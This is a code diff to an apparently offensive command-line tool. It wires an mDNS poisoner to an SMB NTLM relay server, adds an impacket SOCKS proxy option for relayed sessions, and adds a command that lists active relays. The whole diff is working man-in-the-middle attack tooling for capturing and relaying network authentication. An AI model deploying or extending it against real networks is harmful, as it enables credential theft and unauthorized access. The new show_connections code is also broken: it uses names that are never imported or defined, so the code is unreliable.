@@ -2,15 +2,19 @@ from cmd2.command_definition import with_default_category
 from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
 import argparse
 
-from .servers.smbserver import MaliciousSmbServer, NtlmRelayServer
+from .servers.smbserver import MaliciousSmbServer, NtlmRelayAttack
+from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
 from .Poison import MDNS
 from multiprocessing import Process
 from threading import Thread
 import sys
+import os
 import signal
-from loguru import logger
 from cmd2 import ansi
 import cmd2
+import logging
+from loguru import logger
+from time import sleep
 
 
 @with_default_category("Man in the middle attacks")
@@ -25,7 +29,7 @@ class SmbServerAttack(CommandSet):
         print("hola")
 
     def config_poison_and_server(
-        self, mdns_poisoner: MDNS, smbserver: NtlmRelayServer
+        self, mdns_poisoner: MDNS, smbserver: NtlmRelayAttack
     ) -> None:
         """[ Function to launch the threads that will control the mdns poisoner and the smb server]
 
@@ -114,7 +118,7 @@ class NtlmRelay(CommandSet):
         return self.__mdns_poisoner
 
     @property
-    def ntlm_relay_attack(self) -> NtlmRelayServer:
+    def ntlm_relay_attack(self) -> NtlmRelayAttack:
         return self.__ntlm_relay_attack
 
     @mdns_poisoner.setter
@@ -122,26 +126,58 @@ class NtlmRelay(CommandSet):
         self.mdns_poisoner = poisoner
 
     @ntlm_relay_attack.setter
-    def ntlm_relay_attack(self, attack: NtlmRelayServer) -> None:
+    def ntlm_relay_attack(self, attack: NtlmRelayAttack) -> None:
         self.ntlm_relay_attack = attack
 
     def try_exit(self, signum, frame):
-        logger.bind(name="info").debug("Block exit ...")
+        self._cmd.info_logger.debug("Block exit ...")
 
-    def config_poison_and_server(self, asynchronous: bool) -> None:
+    def config_poison_and_server(self, args: argparse.Namespace) -> None:
         """[ Function to launch the threads that will control the mdns poisoner and the smb server]
 
         Args:
             mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
             smbserver (SmbServer): [ variable with the SmbServer Object ]
         """
-        if asynchronous:
+        if args.proxy:
+            self.create_proxy()
+
+        if args.Asynchronous:
+            self.mdns_poisoner.logger_level = "DEBUG"
             signal.signal(signal.SIGINT, self.try_exit)
         mdns_thread = Thread(target=self.mdns_poisoner.start_mdns_poisoning)
         mdns_thread.daemon = True
 
         mdns_thread.start()
         self.ntlm_relay_attack.start_ntlm_relay_server()
+
+    def synchronous_attack(self):
+        try:
+            self.__attack.join()
+        except KeyboardInterrupt:
+            self.__attack.terminate()
+            self.__attack.join()
+            self._cmd.error_logger.warning("Exiting smb relay attack ...")
+
+    def asynchronous_attack(self) -> None:
+        self._cmd.disable_command(
+            "ntlm_relay",
+            ansi.style(
+                "The ntlm_relay command will be disabled while it is running",
+                fg=ansi.fg.bright_yellow,
+            ),
+        )
+        saved_file = ansi.style("logs/ntlm_relay.log", fg=ansi.fg.green)
+        self._cmd.info_logger.info(
+            f"Running ntlm relay on the background the results will be saved at: {saved_file} "
+        )
+
+    def create_proxy(self) -> None:
+        server = SOCKS()
+        server.daemon_threads = True
+        server_thread = Thread(target=server.serve_forever)
+        server_thread.daemon = True
+        server_thread.start()
 
     argParser = Cmd2ArgumentParser(
         description="""Command to perform ntlm relay attack"""
@@ -157,6 +193,13 @@ class NtlmRelay(CommandSet):
         "--Asynchronous",
         action="store_true",
         help="Perform the attack in the background. The results will be saved in log/ntlm_relay",
+    )
+
+    argParser.add_argument(
+        "-P",
+        "--proxy",
+        action="store_true",
+        help="Use a proxy server",
     )
 
     @with_argparser(argParser)
@@ -175,7 +218,7 @@ class NtlmRelay(CommandSet):
         )
 
         # output in case of -SS command
-        self.__ntlm_relay_attack = NtlmRelayServer(
+        self.__ntlm_relay_attack = NtlmRelayAttack(
             self._cmd.LHOST, self._cmd.LPORT, self._cmd.RHOST, args.Asynchronous
         )
 
@@ -195,30 +238,26 @@ class NtlmRelay(CommandSet):
         if args.show_settable:
             self._cmd.show_settable_variables_necessary(settable_variables_required)
         elif self._cmd.check_settable_variables_value(settable_variables_required):
-
-            self.__attack = Process(
-                target=self.config_poison_and_server, args=(args.Asynchronous,)
-            )
+            self.__attack = Process(target=self.config_poison_and_server, args=(args,))
             self.__attack.start()
             if not args.Asynchronous:
-                try:
-                    self.__attack.join()
-                except KeyboardInterrupt:
-                    self.__attack.terminate()
-                    self.__attack.join()
-                    self._cmd.error_logger.warning("Exiting smb relay attack ...")
+                self.synchronous_attack()
             else:
-                self._cmd.disable_command(
-                    "ntlm_relay",
-                    ansi.style(
-                        "The ntlm_relay command will be disabled while it is running",
-                        fg=ansi.fg.bright_yellow,
-                    ),
-                )
-                saved_file = ansi.style("logs/ntlm_relay.log", fg=ansi.fg.green)
-                self._cmd.info_logger.info(
-                    f"Running ntlm relay on the background the results will be saved at: {saved_file} "
-                )
+                self.asynchronous_attack()
+                sleep(1)
+
+    argParser = Cmd2ArgumentParser(description="Command to show actual connections")
+
+    def do_show_connections(self, args: argparse.Namespace) -> None:
+        url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
+        try:
+            handler = ProxyHandler({})
+            open_handler = build_opener(handler)
+            response = Request(url)
+            r = open_handler.open(response)
+            print(items)
+        except Exception:
+            self._cmd.error_logger.error("Error when opening connections")
 
     argParser = Cmd2ArgumentParser(
         description="""Command to stop ntlm relay attack in the background"""
